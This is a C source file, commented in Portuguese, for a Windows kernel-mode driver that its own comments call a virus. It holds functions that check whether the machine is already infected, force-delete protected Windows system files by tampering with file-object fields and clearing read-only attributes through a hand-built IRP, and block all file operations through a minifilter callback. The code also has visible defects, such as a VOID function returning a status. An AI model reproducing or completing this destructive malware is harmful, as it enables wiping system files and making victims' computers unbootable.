

/*

Funções de arquivos, como criar arquivos, deletar ou verificar se existe

*/

/// <summary>
/// Verifica se um arquivo existe, usado para ver se o vírus já infectou a máquina 
/// E fez a "festa", só então, bloquear o carregamento do Windows
/// </summary>
/// <param name="FileName"></param>
/// <returns></returns>
BOOLEAN FileExists(_In_ UNICODE_STRING FileName)
{
	// Verifique o IRQL, se não foi PASSIVE, não continuaremos
	// Isso pode resultar em um BSOD (tela azul)
	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return FALSE;
	}

	// Valor para retornar
	BOOLEAN ReturnStatus = FALSE;

	// Atributos
	OBJECT_ATTRIBUTES Attributes;

	// Inicie os atributos, fazendo com que seja possível verificar o arquivo
	InitializeObjectAttributes(
		&Attributes,
		&FileName,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
		NULL, NULL
	);

	// Alça para abrir o arquivo
	HANDLE FileHandle;
	IO_STATUS_BLOCK Io;

	// Tente abrir o arquivo
	NTSTATUS Status = ZwOpenFile(

		// Salve a alça aqui
		// Pra quem não sabe, uma alça é como um "ID" exclusivo para aquele arquivo, que é 
		// Intrelaçado com o processo, quem nunca tentou apagar um arquivo e recebeu a mensagem
		// "Este arquivo está em uso", isso foi porque uma alça estava aberta para aquele arquivo
		&FileHandle,

		// Queremos somente permissão de leitura
		FILE_READ_ACCESS | SYNCHRONIZE,

		// Os atributos
		&Attributes,
		&Io,

		// Permita que o arquivo seja lido, somente
		FILE_SHARE_READ,

		// O arquivo não é uma pasta
		FILE_NON_DIRECTORY_FILE
	);

	// Se conseguir abrir o arquivo
	if (NT_SUCCESS(Status))
	{
		// Feche a alça
		ZwClose(FileHandle);

		// O arquivo existe
		ReturnStatus = TRUE;
	}

	// Retorne o status
	return ReturnStatus;
}

/// <summary>
/// Completa a rotina de atributos
/// </summary>
/// <param name="DeviceObject"></param>
/// <param name="Irp"></param>
/// <param name="Context"></param>
/// <returns></returns>
NTSTATUS CompleteAttribute(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
	*Irp->UserIosb = Irp->IoStatus;

	if (Irp->UserEvent)
	{
		KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, 0);
	}

	// Libere o IRP
	IoFreeIrp(Irp);

	// Status
	return STATUS_MORE_PROCESSING_REQUIRED;
}

/// <summary>
/// Seta atributos em um arquivo, serve pra remover o somente-leitura
/// Peguei do código antigo do Nottext File Remove
/// </summary>
/// <param name="FileObject"></param>
/// <param name="IoStatusBlock"></param>
/// <param name="FileInformation"></param>
/// <param name="FileInformationLength"></param>
/// <param name="FileInformationClass"></param>
/// <returns></returns>
NTSTATUS IrpSetFileAttributes(PFILE_OBJECT FileObject, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS FileInformationClass
)
{
	// Status
	NTSTATUS Status = STATUS_SUCCESS;

	// Objeto
	PDEVICE_OBJECT DeviceObject;

	// IRP
	PIRP Irp;

	// Evento
	KEVENT SycEvent;

	// IRP
	PIO_STACK_LOCATION irpSp;

	if (
		// Verifique se os valores estao nulos
		FileObject == NULL ||
		IoStatusBlock == NULL ||
		FileInformation == NULL ||
		FileInformationLength <= 0
		)
	{
		// Valores nulo, nao podemos prosseguir
		return STATUS_INVALID_PARAMETER;
	}

	// Pegue o dispositivo
	DeviceObject = IoGetRelatedDeviceObject(FileObject);

	// Se os valores estiverem nulos
	if (DeviceObject == NULL || DeviceObject->StackSize <= 0)
	{
		// Falha
		return STATUS_UNSUCCESSFUL;
	}

	// Aloque o IRP
	Irp = IoAllocateIrp(DeviceObject->StackSize, TRUE);

	// Se nao conseguir
	if (Irp == NULL)
	{
		// Libere o objeto
		ObDereferenceObject(FileObject);

		// Falha
		return STATUS_UNSUCCESSFUL;
	}

	// Inicie o evento
	KeInitializeEvent(&SycEvent, SynchronizationEvent, FALSE);

	// Altere os valores do IRP
	Irp->AssociatedIrp.SystemBuffer = FileInformation;
	Irp->UserEvent = &SycEvent;
	Irp->UserIosb = IoStatusBlock;
	Irp->Tail.Overlay.OriginalFileObject = FileObject;
	Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
	Irp->RequestorMode = KernelMode;

	// Aloque e configure tudo
	irpSp = IoGetNextIrpStackLocation(Irp);
	irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpSp->DeviceObject = DeviceObject;
	irpSp->FileObject = FileObject;

	// Substitua os atributos se existir
	irpSp->Parameters.SetFile.ReplaceIfExists = TRUE;
	irpSp->Parameters.SetFile.Length = FileInformationLength;
	irpSp->Parameters.SetFile.FileInformationClass = FileInformationClass;
	irpSp->Parameters.SetFile.FileObject = FileObject;

	// Complete a rotina
	IoSetCompletionRoutine(Irp, CompleteAttribute, NULL, TRUE, TRUE, TRUE);

	// Chame a funcao
	Status = IoCallDriver(DeviceObject, Irp);

	// Se estiver pendente
	if (Status == STATUS_PENDING)
	{
		// Espere a operação
		KeWaitForSingleObject(&SycEvent, Executive, KernelMode, TRUE, NULL);
	}

	// Status
	Status = IoStatusBlock->Status;

	// Retorne o status
	return Status;
}

/// <summary>
/// Deleta um arquivo protegido, vamos usar para apagar os arquivos do Windows
/// </summary>
/// <param name="FileName"></param>
VOID DeleteFile(_In_ UNICODE_STRING FileName)
{
	// Verifique o IRQL, se não foi PASSIVE, não continuaremos
	// Isso pode resultar em um BSOD (tela azul)
	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return;
	}

	// Atributos
	NTSTATUS Status;
	OBJECT_ATTRIBUTES Attributes;

	// Inicie os atributos para detectar o arquivo
	InitializeObjectAttributes(
		&Attributes,
		&FileName,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
		NULL, NULL
	);

	// Configurações dos arquivos
	HANDLE FileHandle;
	IO_STATUS_BLOCK Io;

	// Abra o arquivo
	Status = ZwOpenFile(
		&FileHandle,
		FILE_READ_ACCESS | SYNCHRONIZE,
		&Attributes,
		&Io,

		// Compartilhe a permissão de deletar
		FILE_SHARE_DELETE,
		FILE_NON_DIRECTORY_FILE
	);

	// Se for fracasso
	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	// Se obter sucesso
	else
	{
		void* object = NULL;

		// Fornece validação de acesso no identificador
		// Podemos "enganar" o Windows para deletar o arquivo
		Status = ObReferenceObjectByHandle(FileHandle, 0, 0, 0, &object, 0);

		// Se obter sucesso
		if (NT_SUCCESS(Status))
		{
			// Altere esse valores, eles vão permitir que deletemos os arquivos
			((FILE_OBJECT*)object)->SectionObjectPointer->ImageSectionObject = 0;
			((FILE_OBJECT*)object)->DeleteAccess = 1;
			((FILE_OBJECT*)object)->WriteAccess = 1;

			// Informações para um arquivo
			FILE_BASIC_INFORMATION FileInformationAttribute;

			// Copie as informações para os atributos
			memset(&FileInformationAttribute, 0, sizeof(FILE_BASIC_INFORMATION));

			// Atributo de arquivo normal
			FileInformationAttribute.FileAttributes = FILE_ATTRIBUTE_NORMAL;

			// Remova o somente-leitura
			Status = IrpSetFileAttributes(object, &Io, &FileInformationAttribute, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation);

			// Delete o arquivo
			ZwDeleteFile(&Attributes);

			// Libere o object
			ObDereferenceObject(object);
		}
	}

	// Se não for nulo
	if (FileHandle != NULL)
	{
		// Feche a alça
		ZwClose(FileHandle);
	}

	return Status;
}

/// <summary>
/// Quando uma operação em arquivo é criada
/// </summary>
/// <param name="Data"></param>
/// <param name="Objects"></param>
/// <param name="Context"></param>
/// <returns></returns>
FLT_PREOP_CALLBACK_STATUS CreateIrpBefore(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS Objects, PVOID* Context)
{
	NTSTATUS Status;
	NTSTATUS ReturnStatus = FLT_PREOP_SUCCESS_NO_CALLBACK;

	// Informações do arquivo
	PFLT_FILE_NAME_INFORMATION FileNameInfo;

	// Obtenha as informações do arquivo
	Status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &FileNameInfo);

	// Se conseguir obter sucesso
	if (NT_SUCCESS(Status))
	{
		// Se conseguir obter todos os dados completamente
		Status = FltParseFileNameInformation(FileNameInfo);

		if (NT_SUCCESS(Status))
		{
			if (DenyAll == TRUE)
			{
				// Altere o retorno, para impedir que passe as operações para
				// Outros drivers
				ReturnStatus = FLT_PREOP_COMPLETE;

				// Acesso negado
				Data->IoStatus.Status = STATUS_ACCESS_DENIED;
				Data->IoStatus.Information = 0;
			}

			FltReleaseFileNameInformation(FileNameInfo);
		}
	}

	// Continue a operação normalmente
	return ReturnStatus;
}
